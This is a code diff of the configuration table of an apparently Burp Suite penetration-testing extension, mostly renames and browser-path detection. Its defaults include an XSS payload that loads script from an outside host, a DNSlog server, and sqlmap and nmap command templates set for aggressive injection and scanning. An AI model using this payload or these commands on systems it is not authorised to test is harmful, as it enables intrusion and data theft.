@@ -1,5 +1,6 @@
 package config;
 
+import java.io.File;
 import java.io.PrintWriter;
 import java.util.ArrayList;
 import java.util.Arrays;
@@ -11,8 +12,9 @@ import javax.swing.event.TableModelEvent;
 import javax.swing.event.TableModelListener;
 import javax.swing.table.AbstractTableModel;
 
+import com.bit4woo.utilbox.utils.SystemUtils;
+
 import burp.BurpExtender;
-import burp.Utils;
 
 
 public class ConfigTableModel extends AbstractTableModel{
@@ -28,12 +30,13 @@ public class ConfigTableModel extends AbstractTableModel{
 	};
 
 	public static final String Firefox_Mac = "/Applications/Firefox.app/Contents/MacOS/firefox";
-	public static final String Firefox_Windows = "D:\\Program Files\\Mozilla Firefox\\firefox.exe";
+	public static final String Firefox_Windows_D = "D:\\Program Files\\Mozilla Firefox\\firefox.exe";
+	public static final String Firefox_Windows_C = "C:\\Program Files\\Mozilla Firefox\\firefox.exe";
 
 	// /usr/local/bin 本地默认可执行文件路径
-	public static final String SQLMap_Command = "python /usr/local/bin/sqlmap-dev/sqlmap.py -r {request.txt} --force-ssl --risk=3 --level=3";
+	public static final String SQLMap_Command = "python /usr/local/bin/sqlmap-dev/sqlmap.py -r {RequestAsFile} --force-ssl --risk=3 --level=3";
 	public static final String Nmap_Command = "nmap -Pn -sT -sV --min-rtt-timeout 1ms "
-			+ "--max-rtt-timeout 1000ms --max-retries 0 --max-scan-delay 0 --min-rate 3000 {host}";
+			+ "--max-rtt-timeout 1000ms --max-retries 0 --max-scan-delay 0 --min-rate 3000 {Host}";
 
 	private static final String Robot_Input_Comment = "this config effects how sqlmap and nmap runs";
 
@@ -41,10 +44,14 @@ public class ConfigTableModel extends AbstractTableModel{
 
 		configEntries.add(new ConfigEntry("Put_MenuItems_In_One_Menu", "",ConfigEntry.Config_Basic_Variable,false,false));
 		configEntries.add(new ConfigEntry("DNSlogServer", "bit.0y0.link",ConfigEntry.Config_Basic_Variable,true,false));
-		if (Utils.isMac()) {
+		if (SystemUtils.isMac()) {
 			configEntries.add(new ConfigEntry("browserPath", Firefox_Mac,ConfigEntry.Config_Basic_Variable,true,false));
 		}else {
-			configEntries.add(new ConfigEntry("browserPath", Firefox_Windows,ConfigEntry.Config_Basic_Variable,true,false));
+			if (new File(Firefox_Windows_C).exists()){
+				configEntries.add(new ConfigEntry("browserPath", Firefox_Windows_C,ConfigEntry.Config_Basic_Variable,true,false));
+			}else {
+				configEntries.add(new ConfigEntry("browserPath", Firefox_Windows_D,ConfigEntry.Config_Basic_Variable,true,false));
+			}
 		}
 		configEntries.add(new ConfigEntry("tokenHeaders", "token,Authorization,Auth,jwt",ConfigEntry.Config_Basic_Variable,true,false));
 		//configEntries.add(new ConfigEntry("DismissedTargets", "{\"*.firefox.com\":\"Drop\",\"*.mozilla.com\":\"Drop\"}",ConfigEntry.Config_Basic_Variable,true,false));
@@ -54,13 +61,10 @@ public class ConfigTableModel extends AbstractTableModel{
 		//configEntries.add(new ConfigEntry("DismissAction", "enable = ACTION_DROP; disable = ACTION_DONT_INTERCEPT",ConfigEntry.Config_Basic_Variable,true,false,"enable this config to use ACTION_DROP,disable to use ACTION_DONT_INTERCEPT"));
 		configEntries.add(new ConfigEntry("XSS-Payload", "'\\\"><sCRiPt/src=//bmw.xss.ht>",ConfigEntry.Config_Basic_Variable,true,false));
 
-		configEntries.add(new ConfigEntry("SQLMap-Command",SQLMap_Command,ConfigEntry.Run_External_Cmd,true,false));
+		configEntries.add(new ConfigEntry("SQLMap-Command",SQLMap_Command,ConfigEntry.Run_External_Cmd,true,true));
 		configEntries.add(new ConfigEntry("Nmap-Command",Nmap_Command,ConfigEntry.Run_External_Cmd,true,false));
-		if (Utils.isMac()){//Mac中，通过脚本执行的也会有命令历史记录，使用这种方式最好
-			configEntries.add(new ConfigEntry("RunTerminalWithRobotInput","",ConfigEntry.Config_Basic_Variable,false,false,Robot_Input_Comment));
-		}else {
-			configEntries.add(new ConfigEntry("RunTerminalWithRobotInput","",ConfigEntry.Config_Basic_Variable,true,false,Robot_Input_Comment));
-		}
+		configEntries.add(new ConfigEntry("RunTerminalWithRobotInput","",ConfigEntry.Config_Basic_Variable,false,false,Robot_Input_Comment));
+		//Mac中，通过脚本执行的也会有命令历史记录，使用这种方式最好
 
 		configEntries.add(new ConfigEntry("Chunked-Length", "10",ConfigEntry.Config_Chunked_Variable,true,false));
 		configEntries.add(new ConfigEntry("Chunked-AutoEnable", "",ConfigEntry.Config_Chunked_Variable,false,false));
@@ -207,6 +211,7 @@ public class ConfigTableModel extends AbstractTableModel{
 			}
 		}
 	}
+	
 
 	////////////////////// extend AbstractTableModel////////////////////////////////
 
@@ -218,7 +223,7 @@ public class ConfigTableModel extends AbstractTableModel{
 
 	@Override
 	public Class<?> getColumnClass(int columnIndex)
-	{	
+	{
 		if (titles[columnIndex].equals("#")) {
 			return Integer.class;//index
 		}else if (titles[columnIndex].equals("Enable")) {
@@ -392,7 +397,7 @@ public class ConfigTableModel extends AbstractTableModel{
 	 */
 	public static List<ConfigEntry> getAllChangeRules() {
 		List<ConfigEntry> result = new ArrayList<ConfigEntry>();
-		List<ConfigEntry> entries = GUI.tableModel.getConfigEntries();
+		List<ConfigEntry> entries = GUI.configTableModel.getConfigEntries();
 		for (ConfigEntry entry:entries) {
 			if (entry.isActionType()) {
 				if (!entry.isDropOrForwardActionType()) {
@@ -404,7 +409,7 @@ public class ConfigTableModel extends AbstractTableModel{
 	}
 
 	/**
-	 * 
+	 *
 	 * @param newrule
 	 */
 	public void delSameRule(ConfigEntry newrule) {
@@ -413,31 +418,29 @@ public class ConfigTableModel extends AbstractTableModel{
 			if (entry.getKey().equalsIgnoreCase(newrule.getKey()) &&
 					entry.getValue().equals(newrule.getValue()) &&
 					entry.getType().equals(newrule.getType())) {
-				GUI.tableModel.removeConfigEntry(entry);
+				GUI.configTableModel.removeConfigEntry(entry);
 			}
 		}
 	}
-	
-	
+
+
 	public void delRuleWithSameKeyAndValue(ConfigEntry newrule) {
 		for (int i= configEntries.size()-1;i>=0;i--) {
 			ConfigEntry entry = configEntries.get(i);
 			if (entry.getKey().equalsIgnoreCase(newrule.getKey()) &&
 					entry.getValue().equals(newrule.getValue())) {
-				GUI.tableModel.removeConfigEntry(entry);
+				GUI.configTableModel.removeConfigEntry(entry);
 			}
 		}
 	}
-	
-	
+
+
 	public void delRuleWithSameKey(ConfigEntry newrule) {
 		for (int i= configEntries.size()-1;i>=0;i--) {
 			ConfigEntry entry = configEntries.get(i);
 			if (entry.getKey().equalsIgnoreCase(newrule.getKey())) {
-				GUI.tableModel.removeConfigEntry(entry);
+				GUI.configTableModel.removeConfigEntry(entry);
 			}
 		}
 	}
-
-
 }
